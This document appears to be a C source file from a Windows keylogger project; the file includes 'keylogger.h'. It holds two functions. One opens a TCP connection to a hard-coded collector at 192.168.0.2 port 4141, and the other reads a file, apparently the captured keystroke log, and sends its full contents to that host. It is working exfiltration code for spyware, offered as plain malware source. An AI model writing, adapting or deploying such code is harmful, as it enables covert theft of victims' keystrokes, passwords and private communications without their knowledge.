#include "keylogger.h"

SOCKET	init_socket(SOCKET my_sock)
{
	struct addrinfo *ptr, *result, hints;
	u_long io = 1;

	SecureZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo("192.168.0.2", "4141", &hints, &ptr) != 0)
	{
		printf("getaddrinfo failed\n");
		return (my_sock);
	}
	for (result = ptr; result != NULL; result = result->ai_next)
	{
		if ((my_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET)
		{
			printf("socket failed\n");
			return (my_sock);
		}
		if (connect(my_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
		{
			if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
			{
				printf("failed shutdown\n");
				closesocket(my_sock);
				return (my_sock);
			}
			closesocket(my_sock);
			my_sock = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(result);
	if ((ioctlsocket(my_sock, FIONBIO, &io)) != NO_ERROR)
		WSAGetLastError();
	return (my_sock);
}

void	send_data(SOCKET my_sock, FILE *fd)
{
	char buf[BUFFSIZE];
	int i;

	i = 0;
	SecureZeroMemory(buf, BUFFSIZE);
	if (my_sock == INVALID_SOCKET)
		return;
	if ((fseek(fd, 0, SEEK_SET)) == -1)
		return;
	while ((i = _read(_fileno(fd), buf, BUFFSIZE)) > 0)
	{
		if (send(my_sock, buf, i, 0) == SOCKET_ERROR)
		{
			printf("failed send\n");
			closesocket(my_sock);
			my_sock = INVALID_SOCKET;
			return; 
		}
		SecureZeroMemory(buf, BUFFSIZE);
	}
	while (recv(my_sock, buf, BUFFSIZE, 0) > 0)
	{
		SecureZeroMemory(buf, BUFFSIZE);
	}
}